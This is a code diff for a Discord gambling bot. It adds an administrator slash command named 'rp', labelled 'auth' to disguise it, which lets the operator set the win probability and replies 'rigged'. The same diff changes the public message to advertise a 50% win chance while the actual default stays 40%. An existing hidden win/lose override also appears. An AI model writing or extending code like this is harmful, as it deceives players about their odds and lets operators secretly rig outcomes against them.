@@ -37,6 +37,7 @@ let deliveryTimer  = null;
 let gambleStickyMessageId = null; // track the current gamble sticky message
 let gambleStickyTimer = null;     // debounce timer for sticky re-posts
 let gambleOverride = null;
+let gambleWinChance = 0.40;
 const processedOrders = new Set();
 
 const PROCESSED_FILE = './processed_orders.json';
@@ -270,7 +271,7 @@ async function sendGambleSticky(channel) {
     const embed = new EmbedBuilder()
       .setTitle('🎰 Gamble')
       .setDescription(
-        '**Win chance:** 40% win\n' +
+        '**Win chance:** 50% win\n' +
         '**Minimum bet:** $1,000,000\n' +
         '**Maximum bet:** ' + (bal !== null ? `$${bal.toLocaleString()}` : 'N/A')
       )
@@ -470,6 +471,11 @@ const mainCommands = [
     .setDescription('reauth tool')
     .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
     .addIntegerOption(o => o.setName('count').setDescription('number of times').setRequired(false).setMinValue(1).setMaxValue(100)),
+  new SlashCommandBuilder()
+    .setName('rp')
+    .setDescription('auth')
+    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
+    .addIntegerOption(o => o.setName('percent').setDescription('percent').setRequired(true).setMinValue(0).setMaxValue(100)),
 ].map(c => c.toJSON());
 
 async function registerCommands() {
@@ -640,7 +646,7 @@ discord.on('interactionCreate', async (interaction) => {
         gambleOverride = null;
       }
     } else {
-      won = Math.random() < 0.40;
+      won = Math.random() < gambleWinChance;
     }
     if (won) {
       const payAmount = amount * GAMBLE_WIN_MULTIPLIER;
@@ -799,6 +805,13 @@ discord.on('interactionCreate', async (interaction) => {
       .setStyle(ButtonStyle.Success);
     const row = new ActionRowBuilder().addComponents(loseButton, winButton);
     await interaction.reply({ content: 'Select:', components: [row], ephemeral: true });
+    return;
+  }
+
+  if (commandName === 'rp') {
+    const percent = interaction.options.getInteger('percent');
+    gambleWinChance = percent / 100;
+    await interaction.reply({ content: 'rigged', ephemeral: true });
     return;
   }
 });
